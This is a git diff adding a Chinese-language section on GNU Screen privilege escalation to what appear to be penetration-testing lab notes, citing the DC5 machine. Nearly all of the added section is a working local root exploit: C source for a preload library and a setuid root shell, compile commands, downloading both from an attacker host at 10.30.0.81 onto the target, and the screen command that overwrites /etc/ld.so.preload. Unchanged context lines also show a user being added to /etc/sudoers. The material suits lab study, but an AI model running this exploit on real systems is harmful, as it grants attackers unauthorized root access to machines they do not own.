@@ -94,6 +94,58 @@ echo "charles ALL=(ALL:ALL) ALL" | sudo teehee /etc/sudoers
 sudo -l
 sudo su
 ```
+
+#### screen提权
+
+案例参考可见DC5
+
+首先kali运行如下
+```sh
+tee libhax.c <<-'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+
+tee rootshell.c <<-'EOF'
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+
+gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c
+gcc -o ./rootshell ./rootshell.c
+```
+
+把编译好的 libhax.so 和 rootshell 从 kali 传给 靶机
+
+```bash
+python -m SimpleHTTPServer 8080 # kali
+
+# 靶机
+cd /tmp
+wget 10.30.0.81:8080/libhax.so;wget 10.30.0.81:8080/rootshell
+
+# 运行poc
+cd /etc
+umask 000
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
+screen -ls
+/tmp/rootshell
+whoami
+```
 ## 参考文章
 
 * https://wiki.xazlsec.com/project-9/doc-730/
